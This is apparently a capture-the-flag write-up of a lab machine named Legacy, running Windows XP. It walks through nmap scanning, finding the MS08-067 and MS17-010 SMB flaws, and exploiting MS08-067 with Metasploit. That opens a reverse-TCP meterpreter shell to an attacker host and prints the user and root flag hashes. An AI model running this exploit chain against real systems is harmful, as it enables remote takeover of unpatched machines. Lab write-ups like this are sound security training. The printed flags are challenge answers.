# Summary
### 1. NMAP, Business as Usual
We see the system is a outdated and old version of Windows, Windows XP (2000 LAN Manager).

### 2. Vulnerability Search
We see lots of SMB exploits when doing a SearchSploit search for Windows 2000. Let's enumerate further.

### 3. NMAP Again
We find that the system is vulnerable to `smb-vuln-ms08-067` & `smb-vuln-ms17-010` on SMB, Port 445.

### 4. Metasploit!
We use a metasploit module `exploit/windows/smb/ms08_067_netapi` for `smb-vuln-ms08-067` and it worked! We got into the system and taken the flags.

# Attack
## 1. NMAP, Business as Usual
```
hippoeug@kali:~$ nmap 10.129.120.139 -sC -sV -Pn -v
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-28 06:04 +08
...
Scanning 10.129.120.139 [1000 ports]
Discovered open port 445/tcp on 10.129.120.139
Discovered open port 139/tcp on 10.129.120.139
...
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d00h27m51s, deviation: 2h07m16s, median: 4d22h57m51s
| nbstat: NetBIOS name: nil, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:de:49 (VMware)
| Names:
|_  
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2021-05-03T03:03:18+03:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
...
```
Wow, interesting, Windows XP (2000 LAN Manager). Unpatched Windows, hell yeah. Let's see..

## 2. Vulnerability Search
```
hippoeug@kali:~$ searchsploit windows 2000 smb
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Microsoft Windows 2000/XP - SMB Authentication Remote Overflow                                                                      | windows/remote/20.txt
Microsoft Windows XP/2000 - 'Mrxsmb.sys' Local Privilege Escalation (MS06-030)                                                      | windows/local/1911.c
Microsoft Windows XP/2000/NT 4.0 - Network Share Provider SMB Request Buffer Overflow (1)                                           | windows/dos/21746.c
Microsoft Windows XP/2000/NT 4.0 - Network Share Provider SMB Request Buffer Overflow (2)                                           | windows/dos/21747.txt
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
Hmm, maybe I need something more direct. Let's scan the ports and see.

## 3. NMAP Again
```
hippoeug@kali:~$ nmap --script vuln 10.129.120.139 -Pn -v
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-28 06:07 +08
...
Scanning 10.129.120.139 [1000 ports]
Discovered open port 445/tcp on 10.129.120.139
Discovered open port 139/tcp on 10.129.120.139
...
PORT     STATE  SERVICE
139/tcp  open   netbios-ssn
445/tcp  open   microsoft-ds
3389/tcp closed ms-wbt-server

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
...
```
OOH, it's vulnerable to `smb-vuln-ms08-067`. And good ol' `smb-vuln-ms17-010` eternalblue which I'm not gonna attempt on this poor XP machine.

## 4. Metasploit!
Let's try it with metasploit. Source: http://scx020c07c.blogspot.com/2012/09/exploitation-windows-xp-using.html
```
hippoeug@kali:~$ msfconsole
msf6 > use exploit/windows/smb/ms08_067_netapi
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms08_067_netapi) > show options
...
msf6 exploit(windows/smb/ms08_067_netapi) > set rhosts 10.129.120.139
rhosts => 10.129.120.139
msf6 exploit(windows/smb/ms08_067_netapi) > set lhost 10.10.x.x
lhost => 10.10.x.x
msf6 exploit(windows/smb/ms08_067_netapi) > exploit

[*] Started reverse TCP handler on 10.10.x.x:4444 
[*] 10.129.120.139:445 - Automatically detecting the target...
[*] 10.129.120.139:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.129.120.139:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.129.120.139:445 - Attempting to trigger the vulnerability...
[*] Sending stage (175174 bytes) to 10.129.120.139
[*] Meterpreter session 1 opened (10.10.x.x:4444 -> 10.129.120.139:1044) at 2021-04-28 06:12:27 +0800
```
And we're in.

Time to find the flags.
```
meterpreter > search -f *.txt
Found 42 results...
    c:\Documents and Settings\Administrator\Application Data\Microsoft\Internet Explorer\brndlog.txt (10389 bytes)
    c:\Documents and Settings\Administrator\Desktop\root.txt (32 bytes)
    c:\Documents and Settings\Administrator\Local Settings\Temp\dd_vcredistMSI2F1B.txt (529446 bytes)
    c:\Documents and Settings\Administrator\Local Settings\Temp\dd_vcredistUI2F1B.txt (11702 bytes)
    c:\Documents and Settings\All Users\Application Data\VMware\VMware Tools\manifest.txt (4334 bytes)
    c:\Documents and Settings\All Users\Application Data\VMware\VMware Tools\Unity Filters\adobeflashcs3.txt (1433 bytes)
    c:\Documents and Settings\All Users\Application Data\VMware\VMware Tools\Unity Filters\adobephotoshopcs3.txt (1712 bytes)
    c:\Documents and Settings\All Users\Application Data\VMware\VMware Tools\Unity Filters\googledesktop.txt (588 bytes)
    c:\Documents and Settings\All Users\Application Data\VMware\VMware Tools\Unity Filters\microsoftoffice.txt (1265 bytes)
    c:\Documents and Settings\All Users\Application Data\VMware\VMware Tools\Unity Filters\vistasidebar.txt (907 bytes)
    c:\Documents and Settings\All Users\Application Data\VMware\VMware Tools\Unity Filters\visualstudio2005.txt (152 bytes)
    c:\Documents and Settings\All Users\Application Data\VMware\VMware Tools\Unity Filters\vmwarefilters.txt (3084 bytes)
    c:\Documents and Settings\All Users\Application Data\VMware\VMware Tools\Unity Filters\win7gadgets.txt (399 bytes)
    c:\Documents and Settings\Default User\Application Data\Microsoft\Internet Explorer\brndlog.txt (141 bytes)
    c:\Documents and Settings\john\Application Data\Microsoft\Internet Explorer\brndlog.txt (10380 bytes)
    c:\Documents and Settings\john\Desktop\user.txt (32 bytes)
    c:\Program Files\Movie Maker\Shared\Empty.txt (18 bytes)
    c:\Program Files\Movie Maker\Shared\Profiles\Blank.txt (21 bytes)
    c:\Program Files\Outlook Express\msoe.txt (133 bytes)
    c:\Program Files\VMware\VMware Tools\open_source_licenses.txt (762285 bytes)
    c:\System Volume Information\_restore{8ACB70A4-C5EE-460F-94BB-8F26DD405EFE}\drivetable.txt (130 bytes)
    c:\System Volume Information\_restore{8ACB70A4-C5EE-460F-94BB-8F26DD405EFE}\RP1\drivetable.txt (130 bytes)
    c:\System Volume Information\_restore{8ACB70A4-C5EE-460F-94BB-8F26DD405EFE}\RP1\snapshot\domain.txt (26 bytes)
    c:\System Volume Information\_restore{8ACB70A4-C5EE-460F-94BB-8F26DD405EFE}\RP2\drivetable.txt (130 bytes)
    c:\System Volume Information\_restore{8ACB70A4-C5EE-460F-94BB-8F26DD405EFE}\RP2\snapshot\domain.txt (26 bytes)
    c:\System Volume Information\_restore{8ACB70A4-C5EE-460F-94BB-8F26DD405EFE}\RP3\snapshot\domain.txt (26 bytes)
    c:\WINDOWS\OEWABLog.txt (1178 bytes)
    c:\WINDOWS\SchedLgU.Txt (2024 bytes)
    c:\WINDOWS\setuplog.txt (747894 bytes)
    c:\WINDOWS\Help\Tours\mmTour\intro.txt (807 bytes)
    c:\WINDOWS\Help\Tours\mmTour\nav.txt (407 bytes)
    c:\WINDOWS\Help\Tours\mmTour\segment1.txt (747 bytes)
    c:\WINDOWS\Help\Tours\mmTour\segment2.txt (772 bytes)
    c:\WINDOWS\Help\Tours\mmTour\segment3.txt (717 bytes)
    c:\WINDOWS\Help\Tours\mmTour\segment4.txt (633 bytes)
    c:\WINDOWS\Help\Tours\mmTour\segment5.txt (799 bytes)
    c:\WINDOWS\system32\eula.txt (29338 bytes)
    c:\WINDOWS\system32\h323log.txt
    c:\WINDOWS\system32\CatRoot2\dberr.txt (4015 bytes)
    c:\WINDOWS\system32\config\systemprofile\Application Data\Microsoft\Internet Explorer\brndlog.txt (141 bytes)
    c:\WINDOWS\system32\drivers\gmreadme.txt (646 bytes)
    c:\WINDOWS\system32\Restore\MachineGuid.txt (78 bytes)
    
meterpreter > pwd
C:\WINDOWS\system32
meterpreter > cd ..
meterpreter > cd ..
meterpreter > ls
[-] Error running command ls: NoMethodError undefined method `[]' for nil:NilClass
```
Bug probably, let's just downgrade to a shell to get flags.
```
meterpreter > shell
Process 2032 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\

16/03/2017  08:30 ��                 0 AUTOEXEC.BAT
16/03/2017  08:30 ��                 0 CONFIG.SYS
16/03/2017  09:07 ��    <DIR>          Documents and Settings
29/12/2017  11:41 ��    <DIR>          Program Files
03/06/2020  09:49 ��    <DIR>          WINDOWS
               2 File(s)              0 bytes
               3 Dir(s)   6.297.468.928 bytes free

C:\>cd "Documents and Settings"
cd "Documents and Settings"

C:\Documents and Settings>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings

16/03/2017  09:07 ��    <DIR>          .
16/03/2017  09:07 ��    <DIR>          ..
16/03/2017  09:07 ��    <DIR>          Administrator
16/03/2017  08:29 ��    <DIR>          All Users
16/03/2017  08:33 ��    <DIR>          john
               0 File(s)              0 bytes
               5 Dir(s)   6.297.464.832 bytes free

...

C:\Documents and Settings\john\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\john\Desktop

16/03/2017  09:19 ��    <DIR>          .
16/03/2017  09:19 ��    <DIR>          ..
16/03/2017  09:19 ��                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)   6.297.464.832 bytes free

C:\Documents and Settings\john\Desktop>type user.txt
type user.txt
e69af0e4f443de7e36876fda4ec7644f

...

C:\Documents and Settings\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\Administrator\Desktop

16/03/2017  09:18 ��    <DIR>          .
16/03/2017  09:18 ��    <DIR>          ..
16/03/2017  09:18 ��                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)   6.297.456.640 bytes free

C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
993442d258b0e0ec917cae9e695d5713
```
